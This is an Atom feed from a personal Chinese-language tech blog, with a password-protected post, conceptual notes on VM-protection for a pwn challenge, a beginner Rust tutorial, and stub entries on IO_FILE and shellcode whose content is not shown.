<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pz1o</title>
  
  <subtitle>pz1o</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2020-12-30T16:05:01.181Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>pz1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2020-12-30T16:05:01.181Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>vmpwn</title>
    <link href="https://pz1o.top/2021/03/29/vmpwn/"/>
    <id>https://pz1o.top/2021/03/29/vmpwn/</id>
    <published>2021-03-29T10:03:03.000Z</published>
    <updated>2021-03-29T11:18:28.735Z</updated>
    
    <content type="html"><![CDATA[<p>自己是个懒狗，而且上次校赛出了vmpwn也不会做，还不思进取。</p><p>所以来写一下这个vmpwn</p><p>先说点其他的，自己逆向太垃圾，一看见这vm直接劝退，希望通过这篇学到点东西</p><h1 id="0x01基础概念"><a href="#0x01基础概念" class="headerlink" title="0x01基础概念"></a>0x01基础概念</h1><h2 id="1-虚拟机保护技术"><a href="#1-虚拟机保护技术" class="headerlink" title="1.虚拟机保护技术"></a>1.虚拟机保护技术</h2><p>所谓虚拟机保护技术，是指将代码翻译为机器和人都无法识别的一串伪代码字节流；在具体执行时再对这些伪代码进行一一翻译解释，逐步还原为原始代码并执行。</p><p>其中VM就是指翻译伪代码并进行执行的子程序。</p><h2 id="2-VStartVM"><a href="#2-VStartVM" class="headerlink" title="2.VStartVM"></a>2.VStartVM</h2><p>虚拟机入口函数</p><h2 id="3-VMDispather"><a href="#3-VMDispather" class="headerlink" title="3.VMDispather"></a>3.VMDispather</h2><p>解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环</p><h2 id="4-opcode"><a href="#4-opcode" class="headerlink" title="4.opcode"></a>4.opcode</h2><p>操作码</p><h2 id="5-寄存器"><a href="#5-寄存器" class="headerlink" title="5.寄存器"></a>5.寄存器</h2><ol><li><code>PC</code>程序计数器，存放内存地址，且总存放着下一条指令的地址。类似于RIP或者EIP</li><li><code>SP</code>指针寄存器，指向栈顶</li><li><code>BP</code>指针寄存器，指向栈中的一个地址</li><li><code>AX</code>通用寄存器，存储返回结果</li></ol><blockquote><p>在初始时，PC指向main函数</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自己是个懒狗，而且上次校赛出了vmpwn也不会做，还不思进取。&lt;/p&gt;
&lt;p&gt;所以来写一下这个vmpwn&lt;/p&gt;
&lt;p&gt;先说点其他的，自己逆向太垃圾，一看见这vm直接劝退，希望通过这篇学到点东西&lt;/p&gt;
&lt;h1 id=&quot;0x01基础概念&quot;&gt;&lt;a href=&quot;#0x01基础概</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://pz1o.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>My RUST</title>
    <link href="https://pz1o.top/2021/03/25/My-RUST/"/>
    <id>https://pz1o.top/2021/03/25/My-RUST/</id>
    <published>2021-03-25T10:03:51.000Z</published>
    <updated>2021-03-30T12:56:30.949Z</updated>
    
    <content type="html"><![CDATA[<p>学过很多语言，却从来没有一门精通的，所以选择RUST来作为我的第一语言。</p><p>先写最基础的知识</p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>首先介绍几个基础知识</p><p>rustup：RUST安装器和版本管理工具</p><p>常用操作就是rustup update</p><p>cargo：Rust的构建工具和包管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cargo build 可以构建项目</span><br><span class="line">cargo run 可以运行项目</span><br><span class="line">cargo test 可以测试项目</span><br><span class="line">cargo doc 可以为项目构建文档</span><br><span class="line">cargo publish 可以将库发布到 crates.io。</span><br></pre></td></tr></table></figure><h2 id="1-新建项目"><a href="#1-新建项目" class="headerlink" title="1.新建项目"></a>1.新建项目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;新建项目</span><br><span class="line">cargo new hello-rust</span><br><span class="line">&#x2F;&#x2F;运行项目</span><br><span class="line">cargo run</span><br></pre></td></tr></table></figure><h2 id="2-添加依赖"><a href="#2-添加依赖" class="headerlink" title="2.添加依赖"></a>2.添加依赖</h2><p>类似于python，cargo也有自己的仓库，但他叫做<a href="https://crates.io/" target="_blank" rel="noopener">crates.io</a></p><p>这里我们来演示一下官网上的教程ferris-says的库</p><p>添加库要去cargo.toml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">ferris-says &#x3D; &quot;0.2&quot;</span><br></pre></td></tr></table></figure><p>之后构建项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo build</span><br></pre></td></tr></table></figure><p>cargo.lock记录了本地所用依赖库的精确版本。</p><h2 id="3-直接编译"><a href="#3-直接编译" class="headerlink" title="3. 直接编译"></a>3. 直接编译</h2><p>如果我们不想用项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rustc main.rs</span><br><span class="line">.&#x2F;main.exe</span><br></pre></td></tr></table></figure><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><h2 id="1-注释"><a href="#1-注释" class="headerlink" title="1.注释"></a>1.注释</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="comment">// 调用编译生成的可执行文件时，这里的语句将被运行。</span></span><br><span class="line"><span class="comment">//行注释</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">块注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">// 将文本打印到控制台</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Hello World!"</span>);<span class="comment">//println!是一个宏</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"I am a Rustacean!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-格式化输出"><a href="#2-格式化输出" class="headerlink" title="2.格式化输出"></a>2.格式化输出</h2><p>打印操作由 <code>std::fmt</code> 里面所定义的一系列 <code>宏</code> 来处理</p><ul><li><p><code>format!</code>：将格式化文本写到 <code>字符串</code>（String）。</p><blockquote><p>  译注：<code>字符串</code> 是返回值不是参数。</p></blockquote></li><li><p><code>print!</code>：与 <code>format!</code> 类似，但将文本输出到控制台（<code>io::stdout</code>）。</p></li><li><p><code>println!</code>: 与 <code>print!</code> 类似，但输出结果追加一个换行符。</p></li><li><p><code>eprint!</code>：与 <code>format!</code> 类似，但将文本输出到标准错误（<code>io::stderr</code>）。</p></li><li><p><code>eprintln!</code>：与 <code>eprint!</code> 类似，但输出结果追加一个换行符。</p></li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;&#125;yyds"</span>,<span class="string">"pz1o"</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;name&#125;yyds"</span>,name=<span class="string">"pz1o"</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;number:&gt;width$&#125;"</span>, number=<span class="number">1</span>, width=<span class="number">6</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;number:&lt;0width$&#125;"</span>, number=<span class="number">1</span>, width=<span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化输出主要有以上几种形式，和python比较类似，但这里数字标准输出还是很有意思的。</p><ul><li><code>fmt::Debug</code>：使用 <code>{:?}</code> 标记。格式化文本以供调试使用。</li><li><code>fmt::Display</code>：使用 <code>{}</code> 标记。以更优雅和友好的风格来格式化文本。</li></ul><h2 id="3-debug"><a href="#3-debug" class="headerlink" title="3.debug"></a>3.debug</h2><p><code>std::fmt</code>只对<strong>特定的类型</strong>实现了标准输出，比如结构体我们是无法直接输出的，这时就需要我们手动实现。</p><p><code>fmt::Debug</code> 这个 <code>trait</code> 使这项工作变得相当简单。所有类型都能推导（<code>derive</code>，即自 动创建）<code>fmt::Debug</code> 的实现。但是 <code>fmt::Display</code> 需要手动实现。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 推导 `Structure` 的 `fmt::Debug` 实现。</span></span><br><span class="line"><span class="comment">// `Structure` 是一个包含单个 `i32` 的结构体。</span></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Structure</span></span>(<span class="built_in">i32</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 `Structure` 放到结构体 `Deep` 中。然后使 `Deep` 也能够打印。</span></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Deep</span></span>(Structure);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="comment">// 使用 `&#123;:?&#125;` 打印和使用 `&#123;&#125;` 类似。</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;:?&#125; months in a year."</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Now &#123;:?&#125; will print!"</span>, Structure(<span class="number">3</span>));</span><br><span class="line">    <span class="comment">// 使用 `derive` 的一个问题是不能控制输出的形式。</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Now &#123;:?&#125; will print!"</span>, Deep(Structure(<span class="number">7</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-美化输出"><a href="#4-美化输出" class="headerlink" title="4.美化输出"></a>4.美化输出</h2><p><code>fmt::Display</code>并没有对每个类型都进行标准化输出，这里我们来自定义实现一下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt; <span class="comment">// （使用 `use`）导入 `fmt` 模块使 `fmt::Display` 可用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带有两个数字的结构体。推导出 `Debug`，以便与 `Display` 的输出进行比较。</span></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MinMax</span></span>(<span class="built_in">i64</span>, <span class="built_in">i64</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 `MinMax` 的 `Display`。</span></span><br><span class="line"><span class="keyword">impl</span> fmt::Display <span class="keyword">for</span> MinMax &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">fmt</span></span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter) -&gt; fmt::<span class="built_in">Result</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 `self.number` 来表示各个数据。</span></span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">"(&#123;&#125;, &#123;&#125;)"</span>, <span class="keyword">self</span>.<span class="number">0</span>, <span class="keyword">self</span>.<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了比较，定义一个含有具名字段的结构体。</span></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point2D</span></span> &#123;</span><br><span class="line">    x: <span class="built_in">f64</span>,</span><br><span class="line">    y: <span class="built_in">f64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似地对 `Point2D` 实现 `Display`</span></span><br><span class="line"><span class="keyword">impl</span> fmt::Display <span class="keyword">for</span> Point2D&#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">fmt</span></span>(&amp;<span class="keyword">self</span>,f: &amp;<span class="keyword">mut</span> fmt::Formatter)-&gt;fmt::<span class="built_in">Result</span>&#123;</span><br><span class="line">        <span class="built_in">write!</span>(f,<span class="string">"x:&#123;0&#125;,y:&#123;1&#125;"</span>,<span class="keyword">self</span>.x,<span class="keyword">self</span>.y)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> minmax = MinMax(<span class="number">0</span>, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Compare structures:"</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Display: &#123;&#125;"</span>, minmax);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Debug: &#123;:?&#125;"</span>, minmax);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> big_range =   MinMax(-<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">    <span class="keyword">let</span> small_range = MinMax(-<span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"The big range is &#123;big&#125; and the small is &#123;small&#125;"</span>,</span><br><span class="line">             small = small_range,</span><br><span class="line">             big = big_range);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> point = Point2D &#123; x: <span class="number">3.3</span>, y: <span class="number">7.2</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Compare points:"</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Display: &#123;&#125;"</span>, point);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Debug: &#123;:?&#125;"</span>, point);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 报错。`Debug` 和 `Display` 都被实现了，但 `&#123;:b&#125;` 需要 `fmt::Binary`</span></span><br><span class="line">    <span class="comment">// 得到实现。这语句不能运行。</span></span><br><span class="line">    <span class="comment">// println!("What does Point2D look like in binary: &#123;:b&#125;?", point);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-变量类型和运算符"><a href="#5-变量类型和运算符" class="headerlink" title="5.变量类型和运算符"></a>5.变量类型和运算符</h2><p><strong>变量</strong></p><ul><li>有符号整型（signed integers）：<code>i8</code>、<code>i16</code>、<code>i32</code>、<code>i64</code> 和 <code>isize</code>（指针宽度）。</li><li>无符号整型（unsigned integers）： <code>u8</code>、<code>u16</code>、<code>u32</code>、<code>u64</code> 和 <code>usize</code>（指针宽 度）。</li><li>浮点类型（floating point）： <code>f32</code>、<code>f64</code>。</li><li><code>char</code>（字符）：单个 Unicode 字符，如 <code>&#39;a&#39;</code>，<code>&#39;α&#39;</code> 和 <code>&#39;∞&#39;</code>（每个都是 4 字节）。</li><li><code>bool</code>（布尔型）：只能是 <code>true</code> 或 <code>false</code>。</li><li>单元类型（unit type）：<code>()</code>。其唯一可能的值就是 <code>()</code> 这个空元组。</li><li>数组（array）：如 <code>[1, 2, 3]</code>通常是同类型的。</li><li>元组（tuple）：如 <code>(1, true)</code>通常是不同类型的。</li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">rust中支持声明变量后，通过后缀进行指定类型</span><br><span class="line">整型默认为<span class="built_in">i32</span>类型，浮点型默认为<span class="built_in">f64</span>类型</span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="comment">// 变量可以给出类型说明。</span></span><br><span class="line">    <span class="keyword">let</span> logical: <span class="built_in">bool</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> a_float: <span class="built_in">f64</span> = <span class="number">1.0</span>;  <span class="comment">// 常规说明</span></span><br><span class="line">    <span class="keyword">let</span> an_integer   = <span class="number">5i32</span>; <span class="comment">// 后缀说明</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否则会按默认方式决定类型。</span></span><br><span class="line">    <span class="keyword">let</span> default_float   = <span class="number">3.0</span>; <span class="comment">// `f64`</span></span><br><span class="line">    <span class="keyword">let</span> default_integer = <span class="number">7</span>;   <span class="comment">// `i32`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类型也可根据上下文自动推断。</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> inferred_type = <span class="number">12</span>; <span class="comment">// 根据下一行的赋值推断为 i64 类型</span></span><br><span class="line">    inferred_type = <span class="number">4294967296i64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可变的（mutable）变量，其值可以改变。</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> mutable = <span class="number">12</span>; <span class="comment">// Mutable `i32`</span></span><br><span class="line">    mutable = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 报错！变量的类型并不能改变。</span></span><br><span class="line">    mutable = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 但可以用掩蔽（shadow）来覆盖前面的变量。</span></span><br><span class="line">    <span class="keyword">let</span> mutable = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运算符</strong></p><p>这里有字面量的概念，如下所写</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1i32</span> <span class="comment">//1作为有符号整型32位</span></span><br><span class="line"><span class="number">1u32</span> <span class="comment">//1作为无符号整型32位</span></span><br><span class="line"><span class="number">0x1u32</span>  <span class="comment">//十六进制1作为无符号整型32位 </span></span><br><span class="line"><span class="number">0</span>o <span class="comment">//八进制</span></span><br><span class="line"><span class="number">0</span>b <span class="comment">//二进制</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="comment">// 整数相加</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"1 + 2 = &#123;&#125;"</span>, <span class="number">1u32</span> + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整数相减</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"1 - 2 = &#123;&#125;"</span>, <span class="number">1i32</span> - <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 试一试 ^ 尝试将 `1i32` 改为 `1u32`，体会为什么类型声明这么重要</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 短路求值的布尔逻辑</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"true AND false is &#123;&#125;"</span>, <span class="literal">true</span> &amp;&amp; <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"true OR false is &#123;&#125;"</span>, <span class="literal">true</span> || <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"NOT true is &#123;&#125;"</span>, !<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 位运算</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"0011 AND 0101 is &#123;:04b&#125;"</span>, <span class="number">0b0011u32</span> &amp; <span class="number">0b0101</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"0011 OR 0101 is &#123;:04b&#125;"</span>, <span class="number">0b0011u32</span> | <span class="number">0b0101</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"0011 XOR 0101 is &#123;:04b&#125;"</span>, <span class="number">0b0011u32</span> ^ <span class="number">0b0101</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"1 &lt;&lt; 5 is &#123;&#125;"</span>, <span class="number">1u32</span> &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"0x80 &gt;&gt; 2 is 0x&#123;:x&#125;"</span>, <span class="number">0x80u32</span> &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用下划线改善数字的可读性！</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"One million is written as &#123;&#125;"</span>, <span class="number">1_000_000u32</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-函数"><a href="#6-函数" class="headerlink" title="6.函数"></a>6.函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn &lt;函数名&gt; ( &lt;参数&gt; ) &lt;函数体&gt;</span><br></pre></td></tr></table></figure><p><strong>函数参数</strong></p><p>rust在声明变量时必须声明参数名称和类型</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">decrypt(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">decrypt</span></span>(<span class="keyword">mut</span> x:<span class="built_in">i32</span>,<span class="keyword">mut</span> y:<span class="built_in">i32</span>)&#123;</span><br><span class="line">x = x-<span class="number">1</span>;</span><br><span class="line">y = y+<span class="number">1</span>;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">"&#123;0&#125;这是x,\n&#123;1&#125;这是y"</span>,x,y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>函数体</strong></p><p>这里有一个很新的概念，表达式块</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">decrypt(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">decrypt</span></span>(<span class="keyword">mut</span> x:<span class="built_in">i32</span>,<span class="keyword">mut</span> y:<span class="built_in">i32</span>)&#123;</span><br><span class="line">x = x-<span class="number">1</span>;</span><br><span class="line">y = &#123;</span><br><span class="line">        <span class="keyword">let</span> y = <span class="number">1</span>;</span><br><span class="line">        x+<span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">"&#123;0&#125;这是x,\n&#123;1&#125;这是y"</span>,x,y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学过很多语言，却从来没有一门精通的，所以选择RUST来作为我的第一语言。&lt;/p&gt;
&lt;p&gt;先写最基础的知识&lt;/p&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 </summary>
      
    
    
    
    
    <category term="RUST" scheme="https://pz1o.top/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE</title>
    <link href="https://pz1o.top/2021/03/25/IO-FILE/"/>
    <id>https://pz1o.top/2021/03/25/IO-FILE/</id>
    <published>2021-03-25T10:02:53.000Z</published>
    <updated>2021-03-27T09:37:33.336Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-FILE结构"><a href="#0x01-FILE结构" class="headerlink" title="0x01 FILE结构"></a>0x01 FILE结构</h1><h2 id="1-FILE-介绍"><a href="#1-FILE-介绍" class="headerlink" title="1.FILE 介绍"></a>1.FILE 介绍</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-FILE结构&quot;&gt;&lt;a href=&quot;#0x01-FILE结构&quot; class=&quot;headerlink&quot; title=&quot;0x01 FILE结构&quot;&gt;&lt;/a&gt;0x01 FILE结构&lt;/h1&gt;&lt;h2 id=&quot;1-FILE-介绍&quot;&gt;&lt;a href=&quot;#1-FILE-介</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>如何编写shellcode</title>
    <link href="https://pz1o.top/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/"/>
    <id>https://pz1o.top/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/</id>
    <published>2021-03-21T11:03:19.000Z</published>
    <updated>2021-03-21T15:46:24.233Z</updated>
    
